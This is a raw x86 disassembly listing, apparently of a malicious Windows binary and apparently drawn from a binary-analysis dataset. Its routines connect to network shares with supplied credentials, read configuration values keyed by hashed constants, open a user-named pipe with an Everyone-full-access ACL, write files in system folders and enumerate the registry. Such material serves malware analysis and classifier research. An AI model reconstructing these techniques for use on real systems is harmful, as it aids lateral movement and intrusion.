push 0x3
push 0x6
push 0x0
push 0x0
push 0xffffffff
push 0x0
call [ CoInitializeSecurity@IAT ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jge r-xdata
xor al al
jmp r-xdata
and [ ebp - 0xc ] 0x0
mov ecx [ ebp + 0x8 ]
call sub_41a144
cmp eax 0x3
jl r-xdata
call [ CoUninitialize@IAT ]
xor al al
jmp r-xdata
leave
retn
push [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
push eax
push [ ebp + 0x8 ]
call sub_40e2da
add esp 0xc
mov [ ebp - 0x5 ] al
push [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
push eax
push [ ebp + 0x8 ]
call sub_40e6a0
add esp 0xc
mov [ ebp - 0x5 ] al
jmp r-xdata
call [ CoUninitialize@IAT ]
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_417232
cmp [ ebp - 0xc ] 0x0
je r-xdata
sub_40efc5
push ebp
mov ebp esp
sub esp 0x2c
and [ ebp - 0x2c ] 0x0
jmp r-xdata
cmp [ ebp - 0x2c ] 0x17
jge r-xdata
xor al al
push 0x20
push 0x0
lea eax [ ebp - 0x28 ]
push eax
call sub_4031e0
add esp 0xc
mov [ ebp - 0x28 ] 0x2
mov [ ebp - 0x24 ] 0x1
mov [ ebp - 0x20 ] 0x9
mov [ ebp - 0x1c ] 0x7
mov eax [ ebp - 0x2c ]
movzx eax [ eax * 2 + rw-data ]
push eax
push r--data
push [ ebp + 0x8 ]
call [ wsprintfW@IAT ]
add esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x14 ] eax
and [ ebp - 0xc ] 0x0
mov [ ebp - 0x4 ] 0x4
push [ ebp - 0x4 ]
push [ ebp + 0x10 ]
push [ ebp + 0x14 ]
lea eax [ ebp - 0x28 ]
push eax
call WNetAddConnection2W
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push 0x1
push [ ebp + 0x8 ]
call WNetCancelConnectionW
jmp r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0x2c ]
inc eax
mov [ ebp - 0x2c ] eax
leave
retn
sub_40f076
push ebp
mov ebp esp
mov eax 0x2234
call sub_40a0e0
push edi
push 0x6
pop ecx
xor eax eax
lea edi [ ebp - 0x2028 ]
[ edi ]
mov [ ebp - 0x200d ] 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
lea eax [ ebp - 0x2028 ]
push eax
call sub_40efc5
add esp 0x10
movzx eax al
test eax eax
je r-xdata
xor al al
push [ ebp + 0x10 ]
push [ ebp + 0x20 ]
lea eax [ ebp - 0x2028 ]
push eax
push r--data
lea eax [ ebp - 0x2230 ]
push eax
call [ wsprintfW@IAT ]
add esp 0x14
push 0x1
lea edx [ ebp - 0x2230 ]
mov ecx [ ebp + 0x8 ]
call sub_411abb
mov [ ebp - 0x200c ] eax
cmp [ ebp - 0x200c ] 0xffffffff
je r-xdata
push 0x1
lea eax [ ebp - 0x2028 ]
push eax
call WNetCancelConnectionW
and [ ebp - 0x2234 ] 0x0
cmp [ ebp - 0x4 ] 0x0
jg r-xdata
push 0x0
push [ ebp - 0x4 ]
lea eax [ ebp - 0x2008 ]
push eax
mov ecx [ ebp + 0xc ]
call sub_410811
push 0x2000
lea eax [ ebp - 0x2008 ]
push eax
mov edx [ ebp - 0x200c ]
mov ecx [ ebp + 0x8 ]
call sub_411a01
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov edx [ ebp - 0x200c ]
mov ecx [ ebp + 0x8 ]
call sub_411aa5
push 0x1
lea eax [ ebp - 0x2028 ]
push eax
call WNetCancelConnectionW
mov al 0x1
jmp r-xdata
pop edi
leave
retn
sub_40f173
push ebp
mov ebp esp
push 0xffffffff
push sub_423c68
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x3d0
lea ecx [ ebp - 0x370 ]
call sub_401068
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x2c ]
call sub_416c24
mov [ ebp - 0x4 ] 0x1
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_413247
movzx eax al
test eax eax
jne r-xdata
and [ ebp - 0x30 ] 0x0
push 0x4
lea eax [ ebp - 0x30 ]
push eax
push 0x4
push r--data
push r--data
mov edx 0x80000001
mov ecx [ ebp + 0x8 ]
call sub_4100e9
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0xd1 ] 0x0
mov [ ebp - 0x37d ] 0x0
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x2c ]
call sub_416bd2
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x370 ]
call sub_4010a3
mov al [ ebp - 0x37d ]
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ ebp - 0xcc ]
mov [ eax ] ecx
mov al [ ebp - 0xd1 ]
mov [ ebp - 0x3d1 ] al
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x2c ]
call sub_416bd2
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x370 ]
call sub_4010a3
mov al [ ebp - 0x3d1 ]
mov eax [ ebp - 0x34 ]
inc eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x384 ] eax
mov [ ebp - 0x388 ] 0x40920001
lea eax [ ebp - 0x384 ]
push eax
lea eax [ ebp - 0x388 ]
push eax
lea eax [ ebp - 0x3a8 ]
push eax
call sub_41e8dd
mov ecx eax
call sub_41e779
mov [ ebp - 0x3d8 ] eax
mov eax [ ebp - 0x3d8 ]
mov [ ebp - 0x3dc ] eax
mov [ ebp - 0x4 ] 0x2
push [ ebp - 0x3dc ]
lea ecx [ ebp - 0x2c ]
call sub_40186c
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x3a8 ]
call sub_416bd2
lea ecx [ ebp - 0x2c ]
call sub_416938
movzx eax al
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
mov [ ebp - 0x3b0 ] 0xf22f2ed
push 0x1
lea eax [ ebp - 0x360 ]
push eax
lea eax [ ebp - 0x3b0 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_416b05
mov [ ebp - 0x3b4 ] 0x124a76f5
push 0x1
lea eax [ ebp - 0xdc ]
push eax
lea eax [ ebp - 0x3b4 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_416b05
mov [ ebp - 0x3b8 ] 0x15289533
push 0x1
lea eax [ ebp - 0x37c ]
push eax
lea eax [ ebp - 0x3b8 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_416b05
mov [ ebp - 0x3bc ] 0x623397cf
push 0x1
lea eax [ ebp - 0xd8 ]
push eax
lea eax [ ebp - 0x3bc ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_416b05
mov [ ebp - 0x3c0 ] 0x7f4becad
push 0x1
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x3c0 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_416b65
mov [ ebp - 0x3c4 ] 0x69b8e0a0
push 0x1
lea eax [ ebp - 0xd0 ]
push eax
lea eax [ ebp - 0x3c4 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_416b65
mov [ ebp - 0x3c8 ] 0x5288a31
push 0x1
lea eax [ ebp - 0x374 ]
push eax
lea eax [ ebp - 0x3c8 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_416b05
push [ ebp - 0x374 ]
lea eax [ ebp - 0xc4 ]
push eax
call [ lstrcpyW@IAT ]
mov [ ebp - 0x3cc ] 0x7c5d2258
push 0x1
lea eax [ ebp - 0x378 ]
push eax
lea eax [ ebp - 0x3cc ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_416b05
push [ ebp - 0x378 ]
lea eax [ ebp - 0x35c ]
push eax
call [ lstrcpyW@IAT ]
mov ecx [ ebp + 0x8 ]
call sub_401577
push eax
push r--data
lea eax [ ebp - 0x15c ]
push eax
call [ wsprintfW@IAT ]
add esp 0xc
lea eax [ ebp - 0x15c ]
push eax
lea eax [ ebp - 0x35c ]
push eax
call [ lstrcatW@IAT ]
lea eax [ ebp - 0x35c ]
push eax
lea eax [ ebp - 0x25c ]
push eax
call [ lstrcpyW@IAT ]
mov [ ebp - 0x3d0 ] 0xc422369
push 0x1
lea eax [ ebp - 0x378 ]
push eax
lea eax [ ebp - 0x3d0 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_416b05
push [ ebp - 0x378 ]
lea eax [ ebp - 0x35c ]
push eax
call [ lstrcatW@IAT ]
mov ecx [ ebp + 0x8 ]
call sub_4115ed
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x38 ] edx
push [ ebp - 0x38 ]
push [ ebp - 0x3c ]
push r--data
lea eax [ ebp - 0x15c ]
push eax
call [ wsprintfW@IAT ]
add esp 0x10
lea eax [ ebp - 0x15c ]
push eax
lea eax [ ebp - 0x25c ]
push eax
call [ lstrcatW@IAT ]
push [ ebp - 0x378 ]
lea eax [ ebp - 0x25c ]
push eax
call [ lstrcatW@IAT ]
and [ ebp - 0xc8 ] 0x0
mov [ ebp - 0x3a9 ] 0x0
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x2c ]
call sub_416bd2
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x370 ]
call sub_4010a3
mov al [ ebp - 0x3a9 ]
jmp r-xdata
cmp [ ebp - 0xcc ] 0x0
jne r-xdata
lea ecx [ ebp - 0x370 ]
call sub_401000
mov [ ebp - 0xcc ] eax
mov [ ebp - 0xd1 ] 0x1
movzx eax [ ebp - 0xd1 ]
test eax eax
jne r-xdata
push [ ebp - 0xd8 ]
push [ ebp - 0x37c ]
push [ ebp - 0xdc ]
push [ ebp - 0x360 ]
lea eax [ ebp - 0x35c ]
push eax
lea eax [ ebp - 0x370 ]
push eax
push [ ebp + 0x8 ]
call sub_40f076
add esp 0x1c
movzx eax al
test eax eax
je r-xdata
cmp [ ebp - 0xcc ] 0x0
jle r-xdata
xor eax eax
inc eax
je r-xdata
cmp [ ebp - 0xcc ] 0x0
jne r-xdata
lea ecx [ ebp - 0x370 ]
call sub_401000
mov [ ebp - 0xcc ] eax
mov [ ebp - 0xd1 ] 0x1
xor eax eax
inc eax
je r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ ebp - 0xcc ]
cmp ecx [ eax ]
jge r-xdata
mov eax [ ebp - 0xc8 ]
inc eax
mov [ ebp - 0xc8 ] eax
mov eax [ ebp - 0xc8 ]
cmp eax [ ebp - 0xd0 ]
jle r-xdata
mov eax [ ebp - 0x40 ]
imul eax eax 0x3e8
push eax
call [ Sleep@IAT ]
push [ ebp - 0xd8 ]
push [ ebp - 0x37c ]
push [ ebp - 0xdc ]
push [ ebp - 0x360 ]
lea eax [ ebp - 0xc4 ]
push eax
lea eax [ ebp - 0x370 ]
push eax
push [ ebp + 0x8 ]
call sub_40f076
add esp 0x1c
movzx eax al
test eax eax
je r-xdata
jmp r-xdata
movzx eax [ ebp - 0xd1 ]
test eax eax
je r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
jmp r-xdata
jmp r-xdata
lea ecx [ ebp - 0x370 ]
call sub_401000
mov [ ebp - 0xcc ] eax
mov [ ebp - 0xd1 ] 0x1
movzx eax [ ebp - 0xd1 ]
test eax eax
jne r-xdata
and [ ebp - 0xcc ] 0x0
push [ ebp - 0xd8 ]
push [ ebp - 0x37c ]
push [ ebp - 0xdc ]
push [ ebp - 0x360 ]
lea eax [ ebp - 0x25c ]
push eax
lea eax [ ebp - 0x370 ]
push eax
push [ ebp + 0x8 ]
call sub_40f076
add esp 0x1c
movzx eax al
test eax eax
je r-xdata
push [ ebp - 0xcc ]
lea ecx [ ebp - 0x370 ]
call sub_40100f
push eax
push [ ebp + 0xc ]
call sub_402b50
add esp 0xc
jmp r-xdata
sub_40f6bd
push ebp
mov ebp esp
sub esp 0x424
mov [ ebp - 0x424 ] ecx
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x104
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x420 ]
push eax
call [ GetUserNameW@IAT ]
test eax eax
jne r-xdata
push r--data
lea eax [ ebp - 0x210 ]
push eax
call [ lstrcpyW@IAT ]
lea eax [ ebp - 0x420 ]
push eax
lea eax [ ebp - 0x210 ]
push eax
call [ lstrcatW@IAT ]
push 0x0
call [ SetLastError@IAT ]
push 0x0
push 0x64
push 0x64
push 0x64
push 0x1
push 0x4
push 0x80003
lea eax [ ebp - 0x210 ]
push eax
call [ CreateNamedPipeW@IAT ]
mov [ rw-data ] eax
call [ GetLastError@IAT ]
mov [ ebp - 0x214 ] eax
cmp [ rw-data ] 0xffffffff
je r-xdata
mov al 0x1
jmp r-xdata
xor al al
jmp r-xdata
cmp [ ebp - 0x214 ] 0x0
je r-xdata
leave
retn
mov al 0x1
sub_40f76b
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x258 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x258 ] 0x0
mov al 0x1
leave
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x254 ] 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
push [ eax + 0x254 ]
call [ CloseHandle@IAT ]
mov eax [ ebp - 0x4 ]
and [ eax + 0x254 ] 0x0
sub_40f7b3
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push [ eax ]
call [ LocalFree@IAT ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push [ eax + 0x34 ]
call [ LocalFree@IAT ]
mov ecx [ ebp - 0x4 ]
call sub_40f76b
leave
retn
mov eax [ ebp - 0x4 ]
push [ eax + 0x30 ]
call [ FreeSid@IAT ]
sub_40f801
push ebp
mov ebp esp
sub esp 0x30
mov [ ebp - 0x2c ] ecx
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x30 ] eax
cmp [ ebp - 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x2c ]
add eax 0x4c
push eax
push 0x1
push 0x0
push 0x2e
push 0x0
call [ SHGetFolderPathW@IAT ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
cmp [ ebp - 0x30 ] 0x1
je r-xdata
mov eax [ ebp - 0x2c ]
add eax 0x4c
push eax
push 0x1
push 0x0
push 0x23
push 0x0
call [ SHGetFolderPathW@IAT ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x30 ] 0x2
je r-xdata
mov eax [ ebp - 0x2c ]
add eax 0x4c
push eax
push 0x1
push 0x0
push 0x2d
push 0x0
call [ SHGetFolderPathW@IAT ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x48 ]
inc eax
mov ecx [ ebp - 0x2c ]
mov [ ecx + 0x48 ] eax
push r--data
mov eax [ ebp - 0x2c ]
add eax 0x4c
push eax
call [ lstrcatW@IAT ]
push r--data
mov eax [ ebp - 0x2c ]
add eax 0x4c
push eax
call [ lstrcatW@IAT ]
mov eax [ ebp - 0x2c ]
push [ eax + 0x44 ]
push [ eax + 0x40 ]
push r--data
lea eax [ ebp - 0x28 ]
push eax
call [ wsprintfW@IAT ]
add esp 0x10
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
add eax 0x4c
push eax
call [ lstrcatW@IAT ]
mov ecx [ ebp - 0x2c ]
mov eax [ ecx + 0x40 ]
mov edx [ ecx + 0x44 ]
mov cl 0x20
call sub_41f5d0
push edx
push eax
push r--data
lea eax [ ebp - 0x28 ]
push eax
call [ wsprintfW@IAT ]
add esp 0x10
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
add eax 0x4c
push eax
call [ lstrcatW@IAT ]
push r--data
mov eax [ ebp - 0x2c ]
add eax 0x4c
push eax
call [ lstrcatW@IAT ]
mov al 0x1
cmp [ ebp - 0x30 ] 0x3
je r-xdata
mov eax [ ebp - 0x2c ]
add eax 0x4c
push eax
push 0x1
push 0x0
push 0x1c
push 0x0
call [ SHGetFolderPathW@IAT ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x30 ] 0x4
je r-xdata
mov eax [ ebp - 0x2c ]
add eax 0x4c
push eax
push 0x1
push 0x0
push 0x5
push 0x0
call [ SHGetFolderPathW@IAT ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x30 ] 0x5
je r-xdata
mov eax [ ebp - 0x2c ]
add eax 0x4c
push eax
push 0x1
push 0x0
push 0x15
push 0x0
call [ SHGetFolderPathW@IAT ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x30 ] 0x6
je r-xdata
mov eax [ ebp - 0x2c ]
add eax 0x4c
push eax
push 0x208
call [ GetTempPathW@IAT ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
jmp r-xdata
jmp r-xdata
xor al al
jmp r-xdata
jmp r-xdata
leave
retn
sub_40f9e7
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0xb ] 0x0
mov [ ebp - 0xa ] 0x0
mov [ ebp - 0x9 ] 0x0
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x7 ] 0x1
mov eax [ ebp - 0x10 ]
add eax 0x30
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x1
lea eax [ ebp - 0xc ]
push eax
call [ AllocateAndInitializeSid@IAT ]
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
push 0x20
mov eax [ ebp - 0x10 ]
add eax 0x10
push eax
call sub_40103d
pop ecx
pop ecx
mov eax [ ebp - 0x10 ]
mov [ eax + 0x10 ] 0x1fffff
mov eax [ ebp - 0x10 ]
mov [ eax + 0x14 ] 0x2
mov eax [ ebp - 0x10 ]
and [ eax + 0x18 ] 0x0
mov eax [ ebp - 0x10 ]
and [ eax + 0x24 ] 0x0
mov eax [ ebp - 0x10 ]
mov [ eax + 0x28 ] 0x5
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0x30 ]
mov [ eax + 0x2c ] ecx
push 0xc
mov eax [ ebp - 0x10 ]
add eax 0x4
push eax
call sub_40103d
pop ecx
pop ecx
mov eax [ ebp - 0x10 ]
add eax 0x34
push eax
push 0x0
mov eax [ ebp - 0x10 ]
add eax 0x10
push eax
push 0x1
call [ SetEntriesInAclW@IAT ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor al al
jmp r-xdata
xor al al
push 0x14
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x10 ]
mov [ ecx ] eax
mov eax [ ebp - 0x10 ]
cmp [ eax ] 0x0
je r-xdata
leave
retn
push 0x1
mov eax [ ebp - 0x10 ]
push [ eax ]
call [ InitializeSecurityDescriptor@IAT ]
test eax eax
je r-xdata
push 0x0
mov eax [ ebp - 0x10 ]
push [ eax + 0x34 ]
push 0x1
mov eax [ ebp - 0x10 ]
push [ eax ]
call [ SetSecurityDescriptorDacl@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov [ eax + 0x4 ] 0xc
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx ]
mov [ eax + 0x8 ] ecx
mov eax [ ebp - 0x10 ]
and [ eax + 0xc ] 0x0
mov al 0x1
jmp r-xdata
sub_40fb19
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov al 0x1
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jne r-xdata
push 0x0
push 0x2
push 0x4
mov eax [ ebp - 0x4 ]
add eax 0x4
push eax
push 0x0
push 0x10000000
mov eax [ ebp - 0x4 ]
add eax 0x4c
push eax
call [ CreateFileW@IAT ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x254 ] eax
push 0x0
push 0x2
push 0x4
push 0x0
push 0x0
push 0x10000000
mov eax [ ebp - 0x4 ]
add eax 0x4c
push eax
call [ CreateFileW@IAT ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x254 ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
call sub_40f801
movzx eax al
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x258 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x254 ] 0xffffffff
je r-xdata
jmp r-xdata
xor al al
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x258 ]
test eax eax
jne r-xdata
leave
retn
sub_40fbc4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
and [ eax ] 0x0
mov eax [ ebp - 0x4 ]
and [ eax + 0x34 ] 0x0
mov eax [ ebp - 0x4 ]
and [ eax + 0x30 ] 0x0
mov ecx [ ebp - 0x4 ]
call sub_40f9e7
mov eax [ ebp - 0x4 ]
mov [ eax + 0x258 ] 0x0
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x38 ] ecx
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
xor ecx ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x40 ] eax
mov [ edx + 0x44 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x40 ] 0x80121211
mov [ eax + 0x44 ] 0x80121211
jmp r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x48 ] 0x0
mov ecx [ ebp - 0x4 ]
call sub_40f801
mov eax [ ebp - 0x4 ]
leave
retn 0x8
sub_40fc37
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x10 ] ecx
or [ ebp - 0x4 ] 0xffffffff
and [ ebp - 0xc ] 0x0
mov eax [ ebp - 0x10 ]
mov al [ eax + 0x258 ]
mov [ ebp - 0x5 ] al
mov ecx [ ebp - 0x10 ]
call sub_40fb19
movzx eax al
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
leave
retn
push 0x2
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov eax [ ebp - 0x10 ]
push [ eax + 0x254 ]
call [ SetFilePointer@IAT ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0xffffffff
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x4 ] 0x4
ja r-xdata
mov ecx [ ebp - 0x10 ]
call sub_40f76b
movzx eax [ ebp - 0x5 ]
test eax eax
jne r-xdata
sub_40fca2
push ebp
mov ebp esp
sub esp 0x14
mov [ ebp - 0x14 ] ecx
and [ ebp - 0xc ] 0x0
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x14 ]
mov al [ eax + 0x258 ]
mov [ ebp - 0x5 ] al
mov ecx [ ebp - 0x14 ]
call sub_40fb19
movzx eax al
test eax eax
je r-xdata
xor al al
mov ecx [ ebp - 0x14 ]
call sub_40fc37
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x8 ]
call sub_4106f0
cmp [ ebp - 0xc ] 0x0
jbe r-xdata
movzx eax [ ebp - 0x5 ]
test eax eax
jne r-xdata
push 0x1
push [ ebp - 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_4105e1
and [ ebp - 0x10 ] 0x0
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov eax [ ebp - 0x14 ]
push [ eax + 0x254 ]
call [ SetFilePointer@IAT ]
push 0x0
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_401000
push eax
mov ecx [ ebp + 0x8 ]
call sub_40100f
push eax
mov eax [ ebp - 0x14 ]
push [ eax + 0x254 ]
call [ ReadFile@IAT ]
push 0x0
push 0x20
push rw-data
mov ecx [ ebp + 0x8 ]
call sub_401000
push eax
mov ecx [ ebp + 0x8 ]
call sub_40100f
mov edx eax
mov eax [ ebp - 0x14 ]
mov ecx [ eax + 0x38 ]
call sub_4182f9
mov ecx [ ebp + 0x8 ]
call sub_40100f
mov eax [ eax ]
mov [ ebp - 0xc ] eax
push 0x4
mov ecx [ ebp + 0x8 ]
call sub_410392
mov ecx [ ebp + 0x8 ]
call sub_401000
sub eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_410367
mov al 0x1
jmp r-xdata
mov ecx [ ebp - 0x14 ]
call sub_40f76b
leave
retn 0x4
sub_40fdaa
push ebp
mov ebp esp
push 0xffffffff
push sub_423a35
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x24
mov [ ebp - 0x30 ] ecx
or [ ebp - 0x24 ] 0xffffffff
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x1c ]
call sub_40169b
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x30 ]
mov al [ eax + 0x258 ]
mov [ ebp - 0x1d ] al
mov ecx [ ebp - 0x30 ]
call sub_40fb19
movzx eax al
test eax eax
je r-xdata
lea ecx [ ebp - 0x1c ]
call sub_401000
xor ecx ecx
cmp [ ebp - 0x24 ] eax
sete cl
mov [ ebp - 0x29 ] cl
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x1c ]
call sub_4010a3
mov al [ ebp - 0x29 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn 0x4
and [ ebp - 0x28 ] 0x0
push 0x0
lea eax [ ebp - 0x28 ]
push eax
push 0x0
mov eax [ ebp - 0x30 ]
push [ eax + 0x254 ]
call [ SetFilePointer@IAT ]
lea ecx [ ebp - 0x1c ]
call sub_401000
push eax
lea ecx [ ebp - 0x1c ]
call sub_410ad8
push 0x0
push 0x20
push rw-data
lea ecx [ ebp - 0x1c ]
call sub_401000
push eax
lea ecx [ ebp - 0x1c ]
call sub_40100f
mov edx eax
mov eax [ ebp - 0x30 ]
mov ecx [ eax + 0x38 ]
call sub_4180ff
push 0x0
lea eax [ ebp - 0x24 ]
push eax
lea ecx [ ebp - 0x1c ]
call sub_401000
push eax
lea ecx [ ebp - 0x1c ]
call sub_40100f
push eax
mov eax [ ebp - 0x30 ]
push [ eax + 0x254 ]
call [ WriteFile@IAT ]
movzx eax [ ebp - 0x1d ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x30 ]
call sub_40f76b
sub_40feb4
push ebp
mov ebp esp
sub esp 0x428
mov [ ebp - 0x428 ] edx
mov [ ebp - 0x424 ] ecx
lea eax [ ebp - 0x214 ]
push eax
push [ ebp + 0x8 ]
push [ ebp - 0x428 ]
call [ RegOpenKeyW@IAT ]
mov [ ebp - 0x218 ] eax
cmp [ ebp - 0x218 ] 0x0
jne r-xdata
xor al al
movzx eax [ ebp + 0x10 ]
test eax eax
je r-xdata
movzx eax [ ebp + 0xc ]
test eax eax
je r-xdata
and [ ebp - 0x20c ] 0x0
mov [ ebp - 0x210 ] 0x104
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x210 ]
push eax
lea eax [ ebp - 0x208 ]
push eax
push [ ebp - 0x20c ]
push [ ebp - 0x214 ]
call [ RegEnumValueW@IAT ]
mov [ ebp - 0x218 ] eax
push [ ebp - 0x214 ]
call [ RegCloseKey@IAT ]
mov al 0x1
jmp r-xdata
and [ ebp - 0x20c ] 0x0
mov [ ebp - 0x210 ] 0x104
push [ ebp - 0x210 ]
lea eax [ ebp - 0x208 ]
push eax
push [ ebp - 0x20c ]
push [ ebp - 0x214 ]
call [ RegEnumKeyW@IAT ]
mov [ ebp - 0x218 ] eax
push [ ebp - 0x214 ]
push [ ebp + 0x18 ]
lea eax [ ebp - 0x208 ]
push eax
push [ ebp + 0x8 ]
call [ ebp + 0x14 ]
add esp 0x10
movzx eax al
test eax eax
jne r-xdata
leave
retn 0x14
push 0x208
push [ ebp + 0x8 ]
lea eax [ ebp - 0x420 ]
push eax
call [ lstrcpynW@IAT ]
lea eax [ ebp - 0x420 ]
push eax
call [ lstrlenW@IAT ]
cmp eax 0x102
jae r-xdata
mov eax [ ebp - 0x20c ]
inc eax
mov [ ebp - 0x20c ] eax
mov [ ebp - 0x210 ] 0x104
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x210 ]
push eax
lea eax [ ebp - 0x208 ]
push eax
push [ ebp - 0x20c ]
push [ ebp - 0x214 ]
call [ RegEnumValueW@IAT ]
mov [ ebp - 0x218 ] eax
jmp r-xdata
